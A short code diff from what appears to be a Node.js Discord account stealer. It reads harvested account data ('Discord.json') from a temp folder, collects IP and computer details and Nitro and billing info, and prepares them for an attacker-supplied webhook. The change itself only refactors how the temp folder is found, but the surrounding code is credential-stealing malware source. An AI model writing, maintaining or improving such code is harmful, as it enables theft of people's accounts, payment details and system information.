@@ -11,12 +11,13 @@ const { userAgent } = require('../config');
 const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar, usernameFormat } = require('../util/discord-account');
 const { sleep } = require('../util/general');
 const { getNameAndVersion } = require('../util/os');
+const { getTempFolder } = require('../util/init');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
 const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
-  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
+  const discordAccountInfo = JSON.parse(readFileSync(join(getTempFolder(), 'Discord.json')).toString());
   const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
 
   const computerInfoFields = [
